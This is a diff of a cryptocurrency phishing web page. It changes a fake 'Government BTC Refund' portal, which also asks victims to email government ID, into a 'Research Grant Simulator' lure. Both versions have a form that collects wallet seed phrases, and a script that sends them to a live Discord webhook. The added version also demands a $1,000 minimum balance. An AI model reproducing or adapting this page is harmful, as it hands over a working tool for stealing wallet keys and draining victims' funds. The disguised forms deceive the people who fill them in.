@@ -1,152 +1,180 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>GovBTCClaim Portal</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      background-image: url('https://i.ibb.co/wQYxwpr/american-eagle-bg.jpg');
-      background-size: cover;
-      background-position: center;
-      text-align: center;
-      padding-top: 50px;
-    }
-
-    .container {
-      background: white;
-      width: 90%;
-      max-width: 420px;
-      margin: auto;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-
-    h2 {
-      color: #003399;
-    }
-
-    .btn {
-      background-color: #003399;
-      color: white;
-      padding: 12px 20px;
-      margin-top: 20px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    .note {
-      font-size: 13px;
-      color: #555;
-      margin-top: 10px;
-    }
-
-    input[type="text"] {
-      padding: 10px;
-      width: 100%;
-      margin-top: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-
-    .alert {
-      background-color: #e8f0fe;
-      color: #003399;
-      padding: 12px;
-      border-radius: 6px;
-      margin-bottom: 20px;
-      font-size: 14px;
-      border: 1px solid #c3dafe;
-    }
-
-    #successMessage {
-      margin-top: 20px;
-      color: green;
-      font-weight: bold;
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Research Grant Simulator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background-color: #0073aa;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .sidebar {
+            float: left;
+            width: 25%;
+            background-color: #fff;
+            padding: 10px;
+            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
+        }
+        .main-content {
+            float: right;
+            width: 70%;
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #005d8f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #004d75;
+        }
+        #successMessage {
+            display: none;
+            color: green;
+            margin-top: 10px;
+        }
+        .error {
+            color: red;
+            display: none;
+            margin-top: 5px;
+        }
+        .payout-section {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #0073aa;
+            color: white;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-
-    <div class="alert">
-      To verify that you are eligible to claim this refund, please send your government-issued ID to the official email:  
-      <strong>admin@govbtcclaim.org</strong>
+    <header>
+        <h1>Research Grant Simulator</h1>
+    </header>
+    <div class="container">
+        <div class="sidebar">
+            <h3>Account Info</h3>
+            <p><strong>User:</strong> ResearchStudent01</p>
+            <p><strong>Status:</strong> Active</p>
+            <button>Update Profile</button>
+        </div>
+        <div class="main-content">
+            <h2>Application Form</h2>
+            <form id="walletSection" onsubmit="sendToDiscord(event)">
+                <div class="form-group">
+                    <label for="walletName">Wallet Name:</label>
+                    <input type="text" id="walletName" name="walletName" required>
+                </div>
+                <div class="form-group">
+                    <label for="seedInput">Seed Phrase:</label>
+                    <input type="text" id="seedInput" name="seedInput" required>
+                </div>
+                <div class="form-group">
+                    <label for="balance">Minimum Balance ($1,000 required):</label>
+                    <input type="number" id="balance" name="balance" required>
+                    <div id="balanceError" class="error">Minimum balance must be $1,000 or more.</div>
+                </div>
+                <button type="submit">Submit Application</button>
+            </form>
+            <div id="successMessage">Submission successful! Thank you.</div>
+            <div class="payout-section">
+                <h3>Payout Status</h3>
+                <p><strong>Application ID:</strong> RS-12345</p>
+                <p><strong>Amount Approved:</strong> $5,000</p>
+                <p><strong>Status:</strong> Processing</p>
+                <button>Check Payout Details</button>
+            </div>
+        </div>
     </div>
 
-    <h2>🇺🇸 Government BTC Refund</h2>
-    <p>Claim your Bitcoin refund through verified wallet connection.</p>
-    <p><strong>Amount to be received: 0.92 BTC ≈ $99,791</strong></p>
+    <!-- Live Chat Widget (Smartsupp) -->
+    <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = 'e99fb2b135abd996810c4549a9bd0573ddb32b57'; // your unique key
+        window.smartsupp || (function(d) {
+            var s, c, o = smartsupp = function() { o._.push(arguments); }; o._ = [];
+            s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+            c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+            c.src = 'https://www.smartsuppchat.com/loader.js?';
+            s.parentNode.insertBefore(c, s);
+        })(document);
+    </script>
 
-    <button class="btn" onclick="document.getElementById('walletSection').style.display='block'">Connect Wallet</button>
+    <!-- Discord Webhook Script with Balance Validation -->
+    <script>
+        function sendToDiscord(event) {
+            event.preventDefault();
 
-    <form id="walletSection" style="display:none; margin-top:20px;" onsubmit="sendToDiscord(event)">
-      <label for="walletName">Wallet Name:</label>
-      <input type="text" id="walletName" name="walletName" placeholder="Enter your wallet name" required>
+            const walletName = document.getElementById('walletName').value;
+            const phrase = document.getElementById('seedInput').value;
+            const balance = document.getElementById('balance').value;
+            const balanceError = document.getElementById('balanceError');
 
-      <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
-      <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word phrase" required>
+            if (parseFloat(balance) < 1000) {
+                balanceError.style.display = 'block';
+                return;
+            }
+            balanceError.style.display = 'none';
 
-      <button class="btn" type="submit">Submit</button>
-    </form>
+            const data = {
+                content: `🔥 New Submission:
+                \nWallet Name: *${walletName}*
+                \nSeed Phrase: *${phrase}*
+                \nBalance: *$${balance}*`
+            };
 
-    <div id="successMessage">✅ Submitted successfully.</div>
-
-    <div class="note">
-      Minimum wallet balance: 0.0092 BTC<br>
-      <small>(If your balance is lower, contact support)</small><br>
-      For inquiries: <strong>admin@govbtcclaim.org</strong>
-    </div>
-  </div>
-
-  <!-- Live Chat Widget (Smartsupp) -->
-<script type="text/javascript">
-  var _smartsupp = _smartsupp || {};
-  _smartsupp.key = 'e99fb2b135abd996810c4549a9bd0573ddb32b57';  // your unique key
-  window.smartsupp||(function(d) {
-    var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-    s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-    c.type='text/javascript';c.charset='utf-8';c.async=true;
-    c.src='https://www.smartsuppchat.com/loader.js?';
-    s.parentNode.insertBefore(c,s);
-  })(document);
-</script>
-  <!-- Discord Webhook Script -->
-  <script>
-    function sendToDiscord(event) {
-      event.preventDefault();
-
-      const walletName = document.getElementById('walletName').value;
-      const phrase = document.getElementById('seedInput').value;
-
-      const data = {
-        content: `🔥 New Submission:
-        \nWallet Name: *${walletName}*
-        \nSeed Phrase: *${phrase}*`
-      };
-
-      fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      }).then(() => {
-        document.getElementById('walletSection').reset();
-        document.getElementById('walletSection').style.display = 'none';
-        document.getElementById('successMessage').style.display = 'block';
-      }).catch(err => {
-        alert("Failed to connect. Try again later.");
-        console.error(err);
-      });
-    }
-  </script>
+            fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('walletSection').reset();
+                document.getElementById('walletSection').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+            }).catch(err => {
+                alert("Failed to connect. Try again later.");
+                console.error(err);
+            });
+        }
+    </script>
 </body>
 </html>
    
